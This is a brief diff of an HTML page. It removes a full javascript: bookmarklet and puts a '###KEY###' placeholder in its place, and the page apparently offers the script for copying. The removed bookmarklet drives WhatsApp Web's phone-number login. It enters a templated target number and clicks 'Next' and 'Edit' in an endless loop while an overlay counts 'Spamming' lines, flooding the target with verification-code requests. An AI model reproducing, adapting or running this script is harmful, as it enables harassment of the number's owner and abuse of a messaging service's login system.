@@ -1,7 +1,7 @@
 <html>
   <head>
     <script type="text/javascript">
-      var key = 'javascript:(()=>{const s=ms=>new Promise(r=>setTimeout(r,ms));const overlay=document.createElement('div');overlay.style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:black;color:white;font-family:monospace;z-index:9999999;display:flex;flex-direction:column;padding:10px;font-size:32px;white-space:pre-wrap;overflow-y:auto;left:0;align-items:flex-start';document.body.appendChild(overlay);let counter=0;const printLine=()=>{const line=document.createElement('div');line.innerText=`> Spamming ${counter++}`;overlay.appendChild(line);};setInterval(printLine,1000);const CODE='+%whatsapp_number_prefix%,NUM='%whatsapp_number%';let b=Array.from(document.querySelectorAll('div[role="button"]')).find(e=>e.textContent.toLowerCase().includes('phone'));if(b)b.click();(async()=>{await s(1000);let i=null;while(!i){i=document.querySelector('input[aria-label="Type your phone number."]');await s(100);}i.focus();i.select();i.setRangeText(CODE+NUM);i.dispatchEvent(new Event('input',{bubbles:true}));await s(1000);while(1){let n=null;while(!n){n=Array.from(document.querySelectorAll('button')).find(e=>e.innerText.trim().toLowerCase()==='next');await s(100);}n.click();await s(1000);let e=null;while(!e){e=Array.from(document.querySelectorAll('a[role="button"]')).find(a=>a.textContent.trim().toLowerCase()==='edit');await s(100);}e.click();await s(20000);}})();})()';
+      var key = '###KEY###';
 
       function copyText() {
         var textArea = document.createElement('textarea');
